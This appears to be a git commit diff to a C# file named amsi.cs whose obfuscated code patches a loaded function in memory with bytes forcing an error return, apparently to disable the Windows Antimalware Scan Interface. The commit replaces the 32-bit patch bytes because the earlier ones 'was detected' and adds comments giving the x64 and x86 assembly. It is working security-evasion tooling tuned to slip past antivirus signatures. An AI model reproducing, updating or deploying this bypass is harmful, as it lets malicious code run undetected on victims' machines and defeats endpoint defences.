90b8247af580f9a49714a94fba481cc236f64eab
Ace Yonca <95192545+Knakiri@users.noreply.github.com>
2025-04-07 01:47:50 +0200

    Update amsi.cs

--- amsi.cs
+++ amsi.cs
@@ -26,7 +26,27 @@ public class amsi
             IntPtr zkqru = LoadLibrary(gklpoiu);
             IntPtr xntwkmv = GetProcAddress(zkqru, msasbnc);
         byte[] ltrhpjt = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x08, 0xFF, 0xE0 } :
-            new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80,0x58, 0x83, 0xC4, 0x18,0xFF, 0xE0 }; //32 bit patch bytes was detected had to update it 
+
+
+
+// x64 assembly
+// mov eax, 0x80070057
+//  mov rax, [rsp]
+//  add rsp, 8
+//  jmp rax
+
+
+
+
+//x86 assembly 
+
+//mov eax, 0x80070057
+//pop eax 
+//add esp, 0x18
+//jmp eax
+
+        
         uint pvrloq;
             if (!VirtualProtect(xntwkmv, (UIntPtr)ltrhpjt.Length, PAGE_EXECUTE_READWRITE, out pvrloq))
             {
